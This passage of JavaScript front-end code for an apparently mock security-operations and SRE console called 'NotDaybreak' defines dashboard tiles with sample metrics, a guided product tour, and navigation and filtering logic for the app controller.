      <div class="tile wide"><div class="tile-h">Top users by failed logons</div>${dashList([{l:'svc-backup',v:247,p:100,c:'var(--red)'},{l:'svc-fin-report',v:38,p:16,c:'var(--amber)'},{l:'admin.jdoe',v:19,p:8,c:'var(--ink-4)'},{l:'svc-print',v:8,p:4,c:'var(--ink-4)'}])}</div>
      <div class="tile"><div class="tile-h">Logon types</div>${dashBars([{l:'Net',v:62,c:'var(--blue)'},{l:'Inter',v:24,c:'var(--violet)'},{l:'Remote',v:9,c:'var(--amber)'},{l:'Svc',v:5,c:'var(--ink-4)'}])}</div>
      <div class="tile"><div class="tile-h">MFA challenges</div><div class="donut" style="background:conic-gradient(var(--green) 0 97%,var(--red) 97% 100%)"><div class="hole">97%</div></div><div class="legend"><span><i style="background:var(--green)"></i>Passed</span><span><i style="background:var(--red)"></i>Denied</span></div></div>`},
    {id:'cspm',name:'Cloud posture',icon:'cube',sub:'CSPM benchmarks',tiles:()=>`
      <div class="tile"><div class="tile-h">Posture score</div><div class="tile-big" style="color:var(--amber)">78<small>%</small></div><div class="tile-sub">CIS benchmark</div></div>
      <div class="tile"><div class="tile-h">Failed findings</div><div class="tile-big" style="color:var(--red-d)">312</div><div class="tile-sub">of 1,420 checks</div></div>
      <div class="tile"><div class="tile-h">Findings by result</div><div class="donut" style="background:conic-gradient(var(--green) 0 78%,var(--red) 78% 100%)"><div class="hole">78%</div></div><div class="legend"><span><i style="background:var(--green)"></i>Passed</span><span><i style="background:var(--red)"></i>Failed</span></div></div>
      <div class="tile wide"><div class="tile-h">Failed checks by resource</div>${dashList([{l:'S3 buckets',v:84,p:100,c:'var(--red)'},{l:'IAM policies',v:61,p:73,c:'var(--amber)'},{l:'Security groups',v:47,p:56,c:'var(--amber)'},{l:'KMS keys',v:22,p:26,c:'var(--blue)'}])}</div>
      <div class="tile"><div class="tile-h">Findings by severity</div>${dashBars([{l:'Crit',v:18,c:'var(--red)'},{l:'High',v:64,c:'var(--amber)'},{l:'Med',v:140,c:'var(--blue)'},{l:'Low',v:90,c:'var(--ink-4)'}])}</div>
      <div class="tile"><div class="tile-h">Accounts monitored</div>${dashKpi([{v:'12',k:'AWS'},{v:'4',k:'GCP'},{v:'3',k:'Azure'}])}</div>`},
    {id:'vuln',name:'Vulnerabilities',icon:'warn',sub:'Cloud-native VM',tiles:()=>`
      <div class="tile"><div class="tile-h">Open vulnerabilities</div><div class="tile-big" style="color:var(--red-d)">1,847</div><div class="tile-sub">across 410 workloads</div></div>
      <div class="tile"><div class="tile-h">Critical CVEs</div><div class="tile-big" style="color:var(--red-d)">42</div><div class="tile-sub">14 with known exploit</div></div>
      <div class="tile"><div class="tile-h">By severity</div><div class="donut" style="background:conic-gradient(var(--red) 0 3%,var(--amber) 3% 22%,var(--blue) 22% 58%,var(--ink-4) 58% 100%)"><div class="hole">1.8k</div></div><div class="legend"><span><i style="background:var(--red)"></i>Critical</span><span><i style="background:var(--amber)"></i>High</span><span><i style="background:var(--blue)"></i>Med</span><span><i style="background:var(--ink-4)"></i>Low</span></div></div>
      <div class="tile wide"><div class="tile-h">Top CVEs by affected hosts</div>${dashList([{l:'CVE-2024-3094 · xz',v:128,p:100,c:'var(--red)'},{l:'CVE-2021-44228 · Log4Shell',v:92,p:72,c:'var(--red)'},{l:'CVE-2023-23397 · Outlook',v:64,p:50,c:'var(--amber)'},{l:'CVE-2022-22965 · Spring4Shell',v:41,p:32,c:'var(--amber)'}])}</div>
      <div class="tile wide"><div class="tile-h">Open vulnerabilities · last 12 days</div>${dashSpark([2100,2050,2010,1980,1960,1940,1920,1900,1890,1875,1860,1847],'var(--green)')}</div>`},
  ],
  nightshift:[
    {id:'svc',name:'Service health',icon:'gauge',sub:'Overview',tiles:()=>{
      const openN=Object.values(state.threads).filter(t=>t.mode==='nightshift'&&t.type!=='chat'&&['open','in-progress','awaiting'].includes(t.status)).length;
      return `<div class="tile"><div class="tile-h">Time to root cause</div><div class="tile-big">12<small>min</small></div><div class="tile-sub up">▼ NightShift autonomous</div></div>
      <div class="tile"><div class="tile-h">Awaiting review</div><div class="tile-big">${openN}<small>open</small></div><div class="tile-sub">agent-opened overnight</div></div>
      <div class="tile wide"><div class="tile-h">checkout-service p99 latency (ms) · last 12h</div>${dashSpark([180,182,178,185,190,240,330,420,480,505,520,520],'var(--violet)')}</div>
      <div class="tile wide"><div class="tile-h">payments-api error rate (%) · last 12h</div>${dashSpark([0.3,0.4,0.3,0.5,1.6,2.8,3.6,4.0,4.1,4.1,4.0,4.1],'var(--red)')}</div>
      <div class="tile"><div class="tile-h">SLO compliance</div><div class="donut" style="background:conic-gradient(var(--green) 0 88%,var(--bg-2) 88% 100%)"><div class="hole">88%</div></div></div>`;
    }},
    {id:'checkout',name:'Checkout latency',icon:'gauge',sub:'p99 regression',tiles:()=>`
      <div class="tile"><div class="tile-h">p99 latency</div><div class="tile-big" style="color:var(--red-d)">520<small>ms</small></div><div class="tile-sub">SLO 300ms · breached</div></div>
      <div class="tile"><div class="tile-h">Regression</div><div class="tile-big">+340<small>ms</small></div><div class="tile-sub">GetCart query span</div></div>
      <div class="tile wide"><div class="tile-h">p99 latency (ms) · last 12h</div>${dashSpark([180,182,178,185,190,240,330,420,480,505,520,520],'var(--violet)')}</div>
      <div class="tile wide"><div class="tile-h">Span breakdown (ms)</div>${dashBars([{l:'GetCart',v:360,c:'var(--red)'},{l:'handler',v:178,c:'var(--blue)'},{l:'render',v:14,c:'var(--ink-4)'}])}</div>`},
    {id:'payments',name:'Payments API',icon:'warn',sub:'Error rate',tiles:()=>`
      <div class="tile"><div class="tile-h">5xx error rate</div><div class="tile-big" style="color:var(--red-d)">4.1<small>%</small></div><div class="tile-sub">after 01:48 config push</div></div>
      <div class="tile"><div class="tile-h">Requests · 1m</div><div class="tile-big">18.2<small>k</small></div><div class="tile-sub">throughput steady</div></div>
      <div class="tile wide"><div class="tile-h">Error rate (%) · last 12h</div>${dashSpark([0.3,0.4,0.3,0.5,1.6,2.8,3.6,4.0,4.1,4.1,4.0,4.1],'var(--red)')}</div>
      <div class="tile"><div class="tile-h">Status mix</div><div class="donut" style="background:conic-gradient(var(--green) 0 96%,var(--red) 96% 100%)"><div class="hole">96%</div></div><div class="legend"><span><i style="background:var(--green)"></i>2xx</span><span><i style="background:var(--red)"></i>5xx</span></div></div>
      <div class="tile"><div class="tile-h">Proposed fix</div><div class="tile-big" style="font-size:18px">Revert</div><div class="tile-sub">awaiting review</div></div>`},
    {id:'infra',name:'Infrastructure',icon:'host',sub:'Hosts & brokers',tiles:()=>`
      <div class="tile"><div class="tile-h">Disk · kafka-broker-3</div><div class="tile-big">68<small>%</small></div><div class="tile-sub up">▼ recovered from 92%</div></div>
      <div class="tile"><div class="tile-h">Pod restarts · 24h</div><div class="tile-big">3<small>ingest-worker</small></div><div class="tile-sub">heap stable post-fix</div></div>
      <div class="tile wide"><div class="tile-h">Cluster memory (%) · last 12h</div>${dashSpark([62,64,66,70,74,78,72,68,64,62,61,60],'var(--amber)')}</div>
      <div class="tile wide"><div class="tile-h">Disk by broker (%)</div>${dashBars([{l:'broker-1',v:54,c:'var(--blue)'},{l:'broker-2',v:61,c:'var(--blue)'},{l:'broker-3',v:68,c:'var(--amber)'}])}</div>`},
    {id:'slo',name:'SLO compliance',icon:'shield',sub:'Budgets',tiles:()=>`
      <div class="tile"><div class="tile-h">SLO compliance</div><div class="donut" style="background:conic-gradient(var(--green) 0 88%,var(--bg-2) 88% 100%)"><div class="hole">88%</div></div></div>
      <div class="tile"><div class="tile-h">Error budget left</div><div class="tile-big">42<small>%</small></div><div class="tile-sub">28-day window</div></div>
      <div class="tile wide"><div class="tile-h">Budget burn · last 12h</div>${dashSpark([100,98,96,95,80,60,55,58,62,66,70,72],'var(--red)')}</div>
      <div class="tile"><div class="tile-h">Services in breach</div><div class="tile-big" style="color:var(--red-d)">1</div><div class="tile-sub">checkout-service</div></div>
      <div class="tile"><div class="tile-h">Healthy</div><div class="tile-big" style="color:var(--green)">11</div><div class="tile-sub">of 12 services</div></div>`},
  ],
};
function renderDashboardsPage(c){
  const mode=state.mode||'dayshift';
  const list=DASHBOARDS[mode]||[];
  let cur=list.find(d=>d.id===state.dashboardId)||list[0];
  state.dashboardId=cur?cur.id:null;
  const pinnedIds=PINNED_DASH[mode]||[];
  const itemRow=d=>`<div class="nav-item ${d.id===state.dashboardId?'active':''}" onclick="App.openDashboard('${d.id}')">
      <span class="ni-ic" style="--tc:var(--blue)">${ic(d.icon,14)}</span>
      <span class="ni-body"><span class="ni-title">${d.name}</span><span class="ni-sub">${d.sub}</span></span>
    </div>`;
  const pinnedList=list.filter(d=>pinnedIds.includes(d.id));
  const restList=list.filter(d=>!pinnedIds.includes(d.id));
  const panelSh='var(--panel-shadow, 0 1px 3px rgba(20,23,28,.05),0 10px 30px rgba(20,23,28,.06))';
  const collapsed=!!state.dashNavCollapsed;
  const aside=collapsed?'':`<aside style="width:272px;flex:0 0 auto;display:flex;flex-direction:column;min-height:0;overflow:hidden;background:var(--panel);border:1px solid var(--shell-line);border-radius:var(--r-lg);box-shadow:${panelSh}">
      ${leftPanelHeader({title:'Dashboards', newTitle:'New dashboard', onNew:"App.stub('New dashboard')", collapse:true, onCollapse:"App.toggleDashNav()"})}
      <div class="nav-scroll">
        <div class="nav-search nav-search-block" style="margin-bottom:8px"><span class="nsi">${ic('search',14)}</span><input placeholder="Search dashboards"></div>
        ${pinnedList.length?`<div class="nav-group"><div class="nav-group-h">${ic('pin',13)} Pinned</div>${pinnedList.map(itemRow).join('')}</div>`:''}
        <div class="nav-group"><div class="nav-group-h">${ic('dashboards',14)} Dashboards <span class="cnt">${restList.length}</span></div>
          ${restList.map(itemRow).join('')}
        </div>
      </div>
    </aside>`;
  const reopen=collapsed?`<button class="sidebar-toggle" title="Show dashboards" onclick="App.toggleDashNav()">${ic('sidebar',16)}</button>`:'';
  c.innerHTML=`<div style="display:flex;flex:1;min-height:0;gap:8px">
    ${aside}
    <div style="flex:1;min-width:0;display:flex;flex-direction:column;min-height:0;overflow:hidden;background:var(--panel);border:1px solid var(--shell-line);border-radius:var(--r-lg);box-shadow:${panelSh}">
      <div class="page-head">${reopen}<div class="page-title">${ic(cur?cur.icon:'grid',18)} ${cur?cur.name:'Dashboards'}<span class="page-sub">${cur?cur.sub:''}</span></div><div class="page-actions">${pageActions('dashboards')}</div></div>
      <div class="page-body"><div class="dash-grid">${cur?cur.tiles():''}</div></div>
    </div>
  </div>`;
}
function renderDashboards(c){
  const day=state.mode==='dayshift';
  const sp=(pts,col)=>{ const w=240,h=56,mx=Math.max(...pts),mn=Math.min(...pts),dx=w/(pts.length-1); const py=v=>h-4-((v-mn)/((mx-mn)||1))*(h-10); let d='M0 '+py(pts[0]).toFixed(0); pts.forEach((v,i)=>{ if(i) d+=' L'+(i*dx).toFixed(0)+' '+py(v).toFixed(0); }); return `<svg class="spark" viewBox="0 0 ${w} ${h}" preserveAspectRatio="none"><path d="${d}" fill="none" stroke="${col}" stroke-width="2" stroke-linejoin="round" vector-effect="non-scaling-stroke"/></svg>`; };
  if(day){
    const fails=[3,5,4,8,6,40,38,12,6,4,3,2];
    const bars=[{l:'Crit',v:1,c:'var(--red)'},{l:'High',v:6,c:'var(--amber)'},{l:'Med',v:1,c:'#d6a72c'},{l:'Low',v:4,c:'var(--blue)'}];
    const bmax=Math.max(...bars.map(b=>b.v))||1; let bh=''; bars.forEach(b=>bh+=`<div class="bcol"><div class="bk" style="height:${Math.max(6,b.v/bmax*70)}px;background:${b.c}"></div><div class="bl">${b.l} ${b.v}</div></div>`);
    const openN=Object.values(state.threads).filter(t=>t.mode==='dayshift'&&t.type!=='chat'&&['open','in-progress','contained'].includes(t.status)).length;
    c.innerHTML=`<div class="pg-head"><h2 class="pg-title">Dashboards</h2></div><div class="dash-grid">
      <div class="tile"><div class="tile-h">Mean time to case</div><div class="tile-big">38<small>sec</small></div><div class="tile-sub up">▼ from 31 min (manual)</div></div>
      <div class="tile"><div class="tile-h">Open records</div><div class="tile-big">${openN}<small>active</small></div><div class="tile-sub">Cases · Hunts · Incidents</div></div>
      <div class="tile wide"><div class="tile-h">Authentication failures · last 12h</div>${sp(fails,'var(--blue)')}</div>
      <div class="tile"><div class="tile-h">Alerts by severity</div><div class="bars-row">${bh}</div></div>
      <div class="tile"><div class="tile-h">Case status</div><div class="donut" style="background:conic-gradient(var(--blue) 0 45%,var(--amber) 45% 70%,var(--green) 70% 100%)"><div class="hole">${openN}</div></div><div class="legend"><span><i style="background:var(--blue)"></i>Open</span><span><i style="background:var(--amber)"></i>In progress</span><span><i style="background:var(--green)"></i>Resolved</span></div></div>
    </div>`;
  } else {
    const lat=[180,182,178,185,190,240,330,420,480,505,520,520];
    const err=[0.3,0.4,0.3,0.5,1.6,2.8,3.6,4.0,4.1,4.1,4.0,4.1];
    const openN=Object.values(state.threads).filter(t=>t.mode==='nightshift'&&t.type!=='chat'&&['open','in-progress','awaiting'].includes(t.status)).length;
    c.innerHTML=`<div class="pg-head"><h2 class="pg-title">Dashboards</h2></div><div class="dash-grid">
      <div class="tile"><div class="tile-h">Time to root cause</div><div class="tile-big">12<small>min</small></div><div class="tile-sub up">▼ NightShift autonomous</div></div>
      <div class="tile"><div class="tile-h">Awaiting review</div><div class="tile-big">${openN}<small>open</small></div><div class="tile-sub">agent-opened overnight</div></div>
      <div class="tile wide"><div class="tile-h">checkout-service p99 latency (ms) · last 12h</div>${sp(lat,'var(--violet)')}</div>
      <div class="tile wide"><div class="tile-h">payments-api error rate (%) · last 12h</div>${sp(err,'var(--red)')}</div>
      <div class="tile"><div class="tile-h">SLO compliance</div><div class="donut" style="background:conic-gradient(var(--green) 0 88%,var(--bg-2) 88% 100%)"><div class="hole">88%</div></div></div>
    </div>`;
  }
}

/* ============================================================ GUIDED TOUR */
let _tour = { i:0, steps:[], active:false };
let _tourRaf=null;
function tourTrack(){
  if(_tourRaf) return;
  const loop=()=>{ _tourRaf=null; if(!_tour.active) return; tourReposition(); _tourRaf=requestAnimationFrame(loop); };
  _tourRaf=requestAnimationFrame(loop);
}
function tourUntrack(){ if(_tourRaf){ cancelAnimationFrame(_tourRaf); _tourRaf=null; } }
function tourEl(t){ try{ return typeof t==='function' ? t() : document.querySelector(t); }catch(e){ return null; } }
function railItemByLabel(label){
  return [...document.querySelectorAll('.rail .rail-item')].find(b=>{
    const l=b.querySelector('.ril'); if(l && l.textContent.trim()===label) return true;
    return (b.title||'').toLowerCase().includes(label.toLowerCase());
  });
}
function tourScrollTo(el){
  if(!el) return; const sc=document.querySelector('.brief-scroll'); if(!sc) return;
  const r=el.getBoundingClientRect(), sr=sc.getBoundingClientRect();
  if(r.top < sr.top+100 || r.bottom > sr.bottom-100){ sc.scrollTop += (r.top - sr.top) - 170; }
}
function tourScrollAny(el){
  /* generic: find the nearest scrollable ancestor and bring el into view (no scrollIntoView) */
  if(!el) return;
  let sc=el.parentElement;
  while(sc && !(sc.scrollHeight>sc.clientHeight+8 && /(auto|scroll|overlay)/.test(getComputedStyle(sc).overflowY))) sc=sc.parentElement;
  if(!sc) return;
  const r=el.getBoundingClientRect(), sr=sc.getBoundingClientRect();
  if(r.top<sr.top+90 || r.bottom>sr.bottom-90){
    sc.scrollTop += (r.top-sr.top) - Math.max(90,(sc.clientHeight-r.height)/2);
  }
}
function tourGoBrief(){ App.goBrief(); App.setQueueView('queue'); }
function tourGoWatches(){ App.autPopClose(); App.go('agents'); App.openAgentView('agents'); }
function buildTourSteps(){
  return [
    { title:"What's new in NotDaybreak", body:"A quick tour of the latest updates: autonomous resolutions with receipts, shift handoff, two-person approvals for critical actions, watch settings right on the queue, and the redesigned Watches page. Step through with Next, or skip anytime." },
    { el:'.brief-subline', place:'bottom', title:'While you were away',
      body:"When NotDaybreak resolves threads on its own, it says so right under the brief title — and the “review the activity” link jumps straight to them.",
      before:()=>{ tourGoBrief(); const sc=document.querySelector('.brief-scroll'); if(sc) sc.scrollTop=0; } },
    { el:'#sec-auto', place:'right', title:'Resolved autonomously',
      body:"Receipts, not tasks. Anything NotDaybreak fixed on its own lands in this block at the foot of the queue — it never counts toward your number. Click a receipt for the full trail: actions taken, reasoning, verification checks. Review and file it, or it files itself to Records at shift change.",
      before:()=>{ tourGoBrief(); App.goReceipts(); } },
    { el:()=>document.querySelector('.brief-settings:not(.brief-hist):not(.brief-handoff)'), place:'left', title:'Queue tools, top right',
      body:"Three quiet icons above the queue: the people icon compiles your shift handoff, the clock flips to decision History, and this gear opens Watches & autonomy — all without leaving the brief.",
      before:()=>{ App.autPopClose(); tourGoBrief(); const sc=document.querySelector('.brief-scroll'); if(sc) sc.scrollTop=0; } },
    { el:()=>document.querySelector('#hoWrap .ski-fly'), place:'left', title:'Hand off the shift',
      body:"When your shift ends, NotDaybreak compiles the handoff for you: decisions taken, work still in motion, anything you deferred, and what's waiting on the next analyst. Add the context only you know, then send — the next shift's brief opens with it.",
      before:()=>{ App.autPopClose(); tourGoBrief(); if(!document.getElementById('hoWrap')) App.handoffOpen(); },
      exit:()=>{ App.handoffClose(); } },
    { el:()=>document.querySelector('#setWrap .ski-fly'), place:'left', title:'Autonomy, per watch',
      body:"Every watch with its duty window and autonomy dial in one flyout. Expand a row to change how far that watch can go on its own, or jump into its full settings.",
      before:()=>{ App.handoffClose(); tourGoBrief(); if(!document.getElementById('setWrap')) App.settingsFlyOpen(); },
      exit:()=>{ App.settingsFlyClose(); } },
    { el:()=>document.querySelector('#actionFlyout .apprv'), place:'left', title:'Two approvals for critical actions',
      body:"Critical containment can't ship on one signature. The confirm sheet names both approvers up front — you approve with the button, the IR lead is asked automatically, and the action executes only once both have signed off. Every approval lands in the audit trail.",
      before:()=>{ App.autPopClose(); tourGoBrief(); if(!document.getElementById('actionFlyout')) openActionFlyout('day-r5',0); },
      exit:()=>{ App.closeActionFlyout(); } },
    { el:()=>document.querySelector('#inspBody .imp-map'), place:'left', title:'Impact map on the record',
      body:"Open a case and the record leads with its impact map — the entry point, what's compromised, and the blast radius, each entity tagged as active, exposed, contained, or at risk.",
      before:()=>{ App.closeActionFlyout(); tourGoBrief(); state.panelWidth=Math.max(state.panelWidth||0,440); App.openRecord('day-r3'); tourScrollAny(document.querySelector('#inspBody .imp-map')); },
      exit:()=>{ state.inspectorOpen=false; renderAll(); } },
    { el:()=>document.querySelector('#appPage .page-pad'), place:'top', title:'Watches, redesigned',
      body:"The Watches page is rebuilt: a live coverage graph up top, a richer card for every watch below, and settings one click from anywhere.",
      before:()=>{ tourGoWatches(); } },
    { el:()=>document.querySelector('#appPage .cov'), place:'bottom', title:'Coverage, hour by hour',
      body:"Who's on duty across 24 hours, watch by watch, with a live “now” marker and the on-duty count. Click any row to open that watch's settings.",
      before:()=>{ tourGoWatches(); tourScrollAny(document.querySelector('#appPage .cov')); } },
    { el:()=>document.querySelector('#appPage .agcard.wt'), place:'right', title:'Watch cards at a glance',
      body:"Each card keeps to the essentials: 7-day runs with a sparkline, acceptance, the autonomy level and data scope. Click anywhere on a card to open that watch's full settings — coverage window, cadence, hand-off and workflows.",
      before:()=>{ tourGoWatches(); tourScrollAny(document.querySelector('#appPage .agcard.wt')); } },
    { el:()=>document.querySelector('#appPage .wt-det .ag-aut2'), place:'right', title:'Watch settings — autonomy first',
      body:"Inside a watch's settings page: the autonomy slider sets how far it can go on its own, and below it sit the duty schedule, assigned workflows, skills, and the data it may touch. Org guardrails still cap everything — gated actions stay gated at any level.",
      before:()=>{ tourGoWatches(); App.openWatchName('Watch Floor'); tourScrollAny(document.querySelector('#appPage .wt-det .ag-aut2')); },
      exit:()=>{ App.watchBack(); } },
    { el:()=>railItemByLabel('Tour'), place:'right', title:'Replay anytime',
      body:"That's what's new. Re-run this tour whenever you like from the Tour button right here.",
      before:()=>{ tourGoBrief(); } },
  ];
}
function tourEnsureDom(){
  if(document.getElementById('tourMask')) return;
  const mask=document.createElement('div'); mask.id='tourMask'; mask.className='tour-mask';
  mask.innerHTML='<div class="tour-spot" id="tourSpot"></div><div class="tour-pop" id="tourPop"></div>';
  document.body.appendChild(mask);
}
function tourPlacePop(pop, r, place){
  pop.classList.remove('center'); pop.style.transform='none';
  const pw=pop.offsetWidth||312, ph=pop.offsetHeight||150, gap=12, vw=innerWidth, vh=innerHeight;
  const below=()=>r.bottom+gap+ph<=vh, above=()=>r.top-gap-ph>=0, right=()=>r.right+gap+pw<=vw, left=()=>r.left-gap-pw>=0;
  let L, T;
  if(place==='right'&&right()){L=r.right+gap;T=r.top;}
  else if(place==='left'&&left()){L=r.left-gap-pw;T=r.top;}
  else if(place==='top'&&above()){L=r.left;T=r.top-gap-ph;}
  else if(place==='bottom'&&below()){L=r.left;T=r.bottom+gap;}
  else if(below()){L=r.left;T=r.bottom+gap;}
  else if(above()){L=r.left;T=r.top-gap-ph;}
  else if(right()){L=r.right+gap;T=r.top;}
  else if(left()){L=r.left-gap-pw;T=r.top;}
  else {L=(vw-pw)/2;T=(vh-ph)/2;}
  pop.style.left=Math.max(12,Math.min(L,vw-pw-12))+'px';
  pop.style.top=Math.max(12,Math.min(T,vh-ph-12))+'px';
}
function tourReposition(){
  if(!_tour.active) return;
  const step=_tour.steps[_tour.i]; if(!step) return;
  const mask=document.getElementById('tourMask'), spot=document.getElementById('tourSpot'), pop=document.getElementById('tourPop');
  if(!mask||!spot||!pop) return;
  const el=step.el?tourEl(step.el):null;
  const r=(el&&el.getBoundingClientRect)?el.getBoundingClientRect():null;
  if(el&&r&&r.width>1&&r.height>1){
    const pad=6;
    mask.classList.remove('no-spot'); spot.style.display='block';
    spot.style.left=(r.left-pad)+'px'; spot.style.top=(r.top-pad)+'px';
    spot.style.width=(r.width+pad*2)+'px'; spot.style.height=(r.height+pad*2)+'px';
    tourPlacePop(pop, r, step.place||'bottom');
  } else {
    mask.classList.add('no-spot'); spot.style.display='none'; pop.classList.add('center');
  }
}
function tourRender(){
  const step=_tour.steps[_tour.i]; if(!step) return App.tourEnd();
  if(step.before){ try{ step.before(); }catch(e){} }
  const pop=document.getElementById('tourPop'); if(!pop) return;
  const total=_tour.steps.length;
  const dots=_tour.steps.map((s,k)=>`<i class="${k===_tour.i?'on':''}"></i>`).join('');
  pop.innerHTML=`
      <div class="tour-step">${ic('tour',13)} ${_tour.i+1} / ${total}<span class="tour-dots">${dots}</span></div>
      <div class="tour-title">${step.title}</div>
      <div class="tour-body">${step.body}</div>
      <div class="tour-foot">
        <button class="tour-skip" onclick="App.tourEnd()">Skip tour</button>
        <div class="tour-nav">
          ${_tour.i>0?'<button class="tour-btn ghost" onclick="App.tourPrev()">Back</button>':''}
          <button class="tour-btn" onclick="App.tourNext()">${_tour.i===total-1?'Done':'Next'}</button>
        </div>
      </div>`;
  tourReposition();
  tourTrack();
}

/* ============================================================ APP CONTROLLER */
const App={
  setMode(m){
    if(state.mode===m) return;
    state.mode=m;
    document.body.classList.toggle('mode-night',m==='nightshift');
    document.body.classList.toggle('mode-day',m==='dayshift');
    // toggle switch UI
    document.querySelectorAll('#modeswitch button').forEach(b=>b.classList.toggle('on',b.dataset.m===m));
    $('#roleLabel').textContent = m==='nightshift'?'Staff SRE':'Senior Analyst';
    renderPermPop();
    if(m==='nightshift'){ stageNight(); state.activeId='night-1'; }
    else { state.activeId='day-1'; }
    state.inspectorOpen = curThread().type!=='chat';
    if(state.inspectorOpen){ if(!state.panelApps.includes('object')) state.panelApps.unshift('object'); state.activeApp='object'; }
    state.inspectorTab='overview';
    renderAll();
  },
  openThread(id){
    closeCardMore();
    state.activeId=id; state.navView='chats'; if(state.dest!=='home') state.dest='home';
    const t=curThread();
    if(id==='night-1') stageNight();
    if(id==='day-r3') cfoInit();
    if(t.type!=='chat'){ state.inspectorOpen=true; if(!state.panelApps.includes('object')) state.panelApps.unshift('object'); state.activeApp='object'; state.inspectorTab='overview';
    }
    state.panelMax=false; state.panelFlyout=false;
    // ephemeral chats: leave the panel as-is (Object shows its empty state if open)
    // restore suggestions for active day chat at right step
    if(id==='day-1' && t.messages.length===0){ t.suggestions=startChips(); }
    renderAll();
  },
  // Click a brief card -> dock the record on the right (same layout as the chat inspector), with the brief on the left instead of the chat.
  openRecord(id){
    closeCardMore();
    const t=state.threads[id]; if(!t) return;
    if(t.type==='chat'){ return App.openThread(id); }
    state.activeId=id;
    if(id==='night-1') stageNight();
    state.inspectorOpen=true;
    if(!state.panelApps.includes('object')) state.panelApps.unshift('object');
    state.activeApp='object'; state.inspectorTab='overview';
    state.panelMax=false; state.panelFlyout=false; state._flyClosing=false;
    renderAll();
  },
  expandSurface(){
    const sc=document.querySelector('.brief-scroll'); const keepTop=sc?sc.scrollTop:0;
    state.surfaceShowAll = !state.surfaceShowAll;
    if(!state.surfaceShowAll) state.surfaceSearch='';   // collapsing the list clears its search
    renderAll();
    const sc2=document.querySelector('.brief-scroll'); if(sc2){ void sc2.offsetHeight; sc2.scrollTop=keepTop; }
  },
  // multi-select: a click toggles the surface in/out of the filter set; threads matching ANY selected surface (OR) stay visible. Pass null to clear all.
  surfaceFilter(label){
    const sc=document.querySelector('.brief-scroll'); const keepTop=sc?sc.scrollTop:0;
    if(label==null){ state.surfaceFilters=[]; }
    else {
      const arr = state.surfaceFilters || (state.surfaceFilters=[]);
      const i = arr.indexOf(label);
      if(i>=0) arr.splice(i,1); else arr.push(label);
    }
    renderAll();
    const sc2=document.querySelector('.brief-scroll'); if(sc2){ void sc2.offsetHeight; sc2.scrollTop=keepTop; }
  },
  // live filter of the surface pick-list — updates the DOM in place so the search field keeps focus (no full re-render)
  surfaceSearchInput(v){
    state.surfaceSearch = v;
    const q = String(v||'').trim().toLowerCase();
    const wrap = document.querySelector('.ov-affected'); if(!wrap) return;
    let any=false;
    wrap.querySelectorAll('.ov-chips .ov-chip').forEach(b=>{
      if(b.hasAttribute('data-label')){
        const hit = !q || (b.getAttribute('data-label')||'').toLowerCase().includes(q);
        b.style.display = hit ? '' : 'none';
        if(hit) any=true;
      } else {
        b.style.display = q ? 'none' : '';   // hide "Show less" while actively searching
      }
    });
    const x = wrap.querySelector('.ov-surface-x'); if(x) x.style.display = q ? '' : 'none';
    const empty = wrap.querySelector('.ov-surface-empty'); if(empty) empty.style.display = (q && !any) ? '' : 'none';
  },
  surfaceSearchClear(){
    const wrap=document.querySelector('.ov-affected');
    const inp=wrap && wrap.querySelector('.ov-surface-input'); if(inp) inp.value='';
    App.surfaceSearchInput('');
    if(inp) inp.focus();
  },
  ovSparkMove(ev, el){
    const pts=(el.dataset.pts||'').split(',').map(Number); const n=pts.length; if(n<2) return;
    const i=ovBucketIdx(ev, el, n); const v=pts[i]||0;
    const max=parseFloat(el.dataset.max)||1;
    const r=el.getBoundingClientRect();
    const cur=el.querySelector('.ov-spark-cursor');
    if(cur){ const topPct=((2.5 + (1 - v/max)*19)/24)*100; cur.style.cssText=`display:block;position:absolute;left:calc(${(i/(n-1))*100}% - 3px);top:calc(${topPct}% - 3px);width:6px;height:6px;border-radius:50%;background:var(--dec);box-shadow:0 0 0 3px color-mix(in srgb,var(--dec) 22%,transparent);pointer-events:none`; }
    const tip=ovTipEl();
    const t0=ovBucketTime(Math.max(0,i-1),n), t1=ovBucketTime(i,n);
    tip.innerHTML=`<div class="ovtip-t">${i>=n-1?'Now':t0+' – '+t1}</div><div class="ovtip-v"><b>${v}</b> in the ${el.dataset.lbl} queue</div><div class="ovtip-hint">${ic('investigation',11)} Click to investigate this window</div>`;
    tip.style.display='block';
    const x=r.left + (i/(n-1))*r.width;
    tip.style.left=Math.max(8, Math.min(window.innerWidth-tip.offsetWidth-8, x-tip.offsetWidth/2))+'px';
    tip.style.top=Math.max(8,(r.top-10-tip.offsetHeight))+'px';
  },
  ovSparkLeave(){ const tip=document.getElementById('ovTip'); if(tip) tip.style.display='none'; document.querySelectorAll('.ov-spark-cursor').forEach(c=>c.style.display='none'); },
  ovSparkClick(ev, el){ App.ovSparkLeave(); const pts=(el.dataset.pts||'').split(',').map(Number); if(pts.length<2) return; ovInvestigate(el.dataset.dec, ovBucketIdx(ev,el,pts.length), pts); },
  scrollToSec(k){ const sc=document.querySelector('.brief-scroll'); const el=document.getElementById('sec-'+k); if(!sc||!el) return; const r=el.getBoundingClientRect(), rs=sc.getBoundingClientRect(); const to=Math.max(0, sc.scrollTop + (r.top - rs.top) - 14); const from=sc.scrollTop, d=to-from, t0=performance.now(), dur=420; if(Math.abs(d)<2) return; const ease=x=>1-Math.pow(1-x,3); const step=(now)=>{ const p=Math.min(1,(now-t0)/dur); sc.scrollTop=from+d*ease(p); if(p<1) requestAnimationFrame(step); }; requestAnimationFrame(step); },
  closeRecordFlyout(){
    const insp=document.getElementById('inspector'); const bd=document.getElementById('inspBackdrop');
    if(insp && insp.classList.contains('as-flyout')){
      state._flyClosing=true;
      insp.classList.add('fly-out'); if(bd) bd.classList.add('fly-out');
      setTimeout(()=>{
        state.inspectorOpen=false; state.panelFlyout=false; state._flyClosing=false;
        const i=document.getElementById('inspector'); if(i) i.classList.add('no-trans');
        renderAll();
        requestAnimationFrame(()=>{ const x=document.getElementById('inspector'); if(x) x.classList.remove('no-trans'); });
      }, 230);
      return;
    }
    state.inspectorOpen=false; state.panelFlyout=false; renderAll();
  },
  // From the flyout/maximized record, jump into the live conversation for this record.
  openChatFromRecord(){ const id=state.activeId; state.panelFlyout=false; state.panelMax=false; App.openThread(id); const w=document.getElementById('streamIn'); if(w) w.scrollTop=w.scrollHeight; },
  newChat(){
    state.activeId='day-1'; state.navView='chats';
    if(state.mode!=='dayshift') this.setMode('dayshift');
    const t=state.threads['day-1'];
    t.messages=[]; t.type='chat'; t.suggestions=startChips(); state.dayStep=0; t.recordId=null; t.status=null;
